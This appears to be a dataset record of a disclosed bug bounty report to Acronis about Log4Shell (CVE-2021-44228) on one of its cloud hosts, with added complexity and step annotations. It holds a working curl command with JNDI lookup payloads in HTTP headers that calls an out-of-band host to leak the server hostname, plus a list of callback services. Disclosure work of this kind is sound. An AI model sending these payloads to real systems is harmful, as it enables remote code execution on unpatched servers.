@@ -1,0 +1,38 @@
+{
+  "reported_to": "Acronis",
+  "reported_by": "mikkocarreon ",
+  "title": "[CVE-2021-44228] Arbitrary Code Execution on ng01-cloud.acronis.com",
+  "content": "\nDescription\nThe application is using a vulnerable version of Log4j which allows arbitrary remote command execution. The vulnerability is also known as Log4Shell and is assigned CVE-2021-44228.\nReproduction Steps\nFor easier reproduction, please use Burp Collaborator and issue the following curl command with your collaborator instance URL;\nCode 296 Bytes\n1curl --http1.1 --silent --output /dev/null \\\n2--header 'User-agent: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \\\n3--header 'X-Forwarded-For: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \\\n4--header 'Referer: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \\\n5https://ng01-cloud.acronis.com\nYou should receive a request to your Collaborator Client with your server's hostname as the prefix. That should suffice to prove that the host is vulnerable. The hostname I received was ng01-cloud-elk-ls-vm01.\nNote that it may take some time to receive the pingbacks. In case Burp Collaborator doesn't work, I'd advise using your own. Some alternatives are;\ndig.pm\napp.interactsh.com\ndnslog.cn\npingb.in\nrequestbin.net\ncanarytokens.com\nReference\nhttps://www.lunasec.io/docs/blog/log4j-zero-day/\nImpact\nArbitrary remote code execution\n\n",
+  "severity": [
+    10.0,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "None"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1724850180,
+  "report_url": "https://hackerone.com/reports/1459714",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Use Burp Collaborator or an alternative service to generate a unique URL for receiving requests."
+    ],
+    [
+      2,
+      "Execute the curl command with the generated URL in the User-agent, X-Forwarded-For, and Referer headers targeting https://ng01-cloud.acronis.com."
+    ]
+  ],
+  "vuln_description": "The application is using a vulnerable version of Log4j, which allows arbitrary remote command execution via the Log4Shell vulnerability (CVE-2021-44228). This can be exploited by sending specially crafted headers containing JNDI lookup strings.",
+  "reason": "The vulnerability is straightforward to exploit once the tester is aware of the Log4Shell vulnerability and knows how to craft the JNDI lookup strings. The attack involves sending a simple HTTP request with malicious headers, and the interaction is direct and well-documented.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null
+}
